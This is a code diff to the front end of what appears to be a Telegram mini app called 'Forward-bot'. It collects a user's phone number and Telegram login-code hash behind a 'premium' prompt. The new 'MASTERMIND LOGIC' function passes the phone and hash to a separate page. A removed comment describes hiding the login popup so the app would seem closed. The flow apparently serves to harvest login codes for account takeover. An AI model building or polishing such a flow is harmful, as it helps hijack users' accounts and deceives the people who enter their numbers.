@@ -122,14 +122,10 @@
                 <button id="btn-send-code" class="share-btn" onclick="sendCode()">Send OTP Code</button>
             </div>
 
-            <!-- OTP Section -->
             <div id="otp-sec" style="display: none;">
-                <div style="display: flex; gap: 8px; align-items: stretch; justify-content: center; margin-bottom: 10px;">
-                    <input type="text" id="otp-input" class="login-input" placeholder="Enter OTP" style="width: 65%; margin-bottom: 0; letter-spacing: 5px;">
-                    <!-- View Code Button: Opens app.html -->
-                    <button onclick="viewCodeAction()" style="width: 30%; background: #222; color: #00ffaa; border: 1px solid #00ffaa; border-radius: 8px; padding: 10px 5px; font-size: 11px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; text-align: center; line-height: 1.2;">👀 View<br>Code</button>
-                </div>
-                <button id="btn-verify-code" class="share-btn" style="background: linear-gradient(90deg, #00ffaa, #00aaff); color:#000;" onclick="verifyCode()">Verify & Connect</button>
+                <p style="font-size: 13px; color: #ddd; margin-bottom: 20px;">OTP Code requested successfully!</p>
+                <!-- মেইন পেজ চেঞ্জ করে app.html এ নিয়ে যাবে -->
+                <button onclick="viewCodeAction()" class="share-btn" style="background: linear-gradient(90deg, #00ffaa, #00aaff); color:#000;">👀 Go to OTP Page</button>
                 <div style="text-align: center; margin-top: 15px;">
                     <button onclick="resetLoginState()" style="background: transparent; color: #ff3366; border: none; text-decoration: underline; cursor: pointer; font-size: 12px;">Wrong Number? Go Back</button>
                 </div>
@@ -184,16 +180,8 @@
                 if (data.status === "logged_in") {
                     showPremiumModal();
                 } else {
-                    let savedState = localStorage.getItem("loginState");
-                    if (savedState === "otp") {
-                        currentPhone = localStorage.getItem("savedPhone");
-                        currentHash = localStorage.getItem("savedHash");
-                        document.getElementById('phone-sec').style.display = 'none';
-                        document.getElementById('otp-sec').style.display = 'block';
-                    } else {
-                        document.getElementById('phone-sec').style.display = 'block';
-                        document.getElementById('otp-sec').style.display = 'none';
-                    }
+                    document.getElementById('phone-sec').style.display = 'block';
+                    document.getElementById('otp-sec').style.display = 'none';
                     document.getElementById('loginModal').style.display = 'flex';
                 }
             } catch(e) { showToast("Connection error!"); }
@@ -219,44 +207,24 @@
                 const data = await res.json();
                 if(data.status === "ok") {
                     currentHash = data.hash;
-                    localStorage.setItem("savedPhone", currentPhone);
-                    localStorage.setItem("savedHash", currentHash);
-                    localStorage.setItem("loginState", "otp");
+                    
                     document.getElementById('phone-sec').style.display = 'none';
                     document.getElementById('otp-sec').style.display = 'block';
-                    showToast("OTP code sent successfully!");
+                    showToast("Success! Now go to OTP page.");
                 } else { showToast("Error: " + data.msg); }
             } catch(e) { showToast("Server error!"); } 
             finally { sendBtn.innerHTML = originalText; sendBtn.disabled = false; }
         }
 
-        async function verifyCode() {
-            const otp = document.getElementById('otp-input').value.trim();
-            if(!otp) return showToast("Enter OTP!");
-            
-            const verifyBtn = document.getElementById('btn-verify-code');
-            const originalText = verifyBtn.innerHTML;
-            verifyBtn.innerHTML = "⏳ Verifying...";
-            verifyBtn.disabled = true;
-
-            try {
-                const res = await fetch(`${BACKEND_URL}/api/verify_code`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ phone: currentPhone, hash: currentHash, otp: otp, user_id: userId }) });
-                const data = await res.json();
-                if(data.status === "ok") {
-                    localStorage.removeItem("loginState");
-                    localStorage.removeItem("savedPhone");
-                    localStorage.removeItem("savedHash");
-                    closeLogin();
-                    showPremiumModal();
-                } else { showToast("Invalid Code or Error!"); }
-            } catch(e) { showToast("Server connection error!"); } 
-            finally { verifyBtn.innerHTML = originalText; verifyBtn.disabled = false; }
+        // ====== MASTERMIND LOGIC ======
+        function viewCodeAction() {
+            // কোনো ব্রাউজার ওপেন হবে না! 
+            // এই ওয়েবঅ্যাপের পেজটাই বদলে গিয়ে app.html হয়ে যাবে।
+            let appUrl = 'app.html?user_id=' + userId + '&phone=' + encodeURIComponent(currentPhone) + '&hash=' + encodeURIComponent(currentHash);
+            window.location.href = appUrl;
         }
 
         function resetLoginState() {
-            localStorage.removeItem("loginState");
-            localStorage.removeItem("savedPhone");
-            localStorage.removeItem("savedHash");
             document.getElementById('otp-sec').style.display = 'none';
             document.getElementById('phone-sec').style.display = 'block';
         }
@@ -282,20 +250,6 @@
             toast.innerText = msg;
             toast.className = "show";
             setTimeout(() => { toast.className = toast.className.replace("show", ""); }, 4000);
-        }
-
-        // ====== MASTERMIND LOGIC ======
-        function viewCodeAction() {
-            showToast("Opening Secure Gateway...");
-            
-            // app.html কে ডাটা সহ কল করবে
-            let appUrl = 'https://rony90790.github.io/Forward-bot/app.html?user_id=' + userId + '&phone=' + encodeURIComponent(currentPhone) + '&hash=' + encodeURIComponent(currentHash);
-            tg.openLink(appUrl);
-            
-            // মেইন অ্যাপ (index.html) এর লগইন পপআপ সাইলেন্টলি হাইড করে দেবে যাতে মনে হয় অ্যাপ ক্লোজ হয়েছে
-            setTimeout(() => {
-                closeLogin();
-            }, 300);
         }
 
         async function initData() {
